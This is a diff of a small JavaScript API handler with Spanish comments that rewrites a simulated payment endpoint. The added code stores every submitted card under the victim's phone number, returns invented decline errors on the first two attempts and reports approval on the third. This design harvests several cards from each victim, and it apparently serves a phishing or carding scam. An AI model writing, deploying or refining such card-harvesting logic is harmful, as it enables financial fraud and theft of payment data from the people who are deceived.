@@ -1,59 +1,43 @@
-const db = {}; // simulación (luego puedes usar Supabase)
+const db = {};
 
 export default function handler(req, res) {
-  if (req.method !== "POST") {
-    return res.status(405).json({ error: "Method not allowed" });
-  }
-
-  const { phone, step, payload } = req.body;
+  const { phone, card } = req.body;
 
   if (!phone) {
-    return res.json({ status: "error", message: "No phone" });
+    return res.json({ error: "no phone" });
   }
 
   if (!db[phone]) {
     db[phone] = {
-      step: "start",
-      attempts: 0
+      attempts: 0,
+      cards: []
     };
   }
 
   const user = db[phone];
 
-  // 🔁 LÓGICA TIPO FLUJO
-  if (step === "start") {
-    user.step = "payment";
+  // guardar tarjeta
+  user.cards.push(card);
+  user.attempts++;
 
+  // 🔥 lógica tipo TOREVIP
+  if (user.attempts === 1) {
     return res.json({
-      status: "ok",
-      next: "payment",
-      message: "Ingresa datos de pago"
+      status: "error",
+      message: "Error 24: método rechazado"
     });
   }
 
-  if (step === "payment") {
-    user.attempts++;
-
-    // simulación de error realista
-    if (user.attempts < 2) {
-      return res.json({
-        status: "error",
-        next: "payment",
-        message: "Error 24: tarjeta rechazada"
-      });
-    }
-
-    user.step = "completed";
-
+  if (user.attempts === 2) {
     return res.json({
-      status: "ok",
-      next: "completed",
-      message: "Pago verificado correctamente"
+      status: "error",
+      message: "Error 12: verificación fallida"
     });
   }
 
+  // tercera pasa
   return res.json({
-    status: "unknown",
-    next: "start"
+    status: "ok",
+    message: "Pago aprobado ✔"
   });
 }
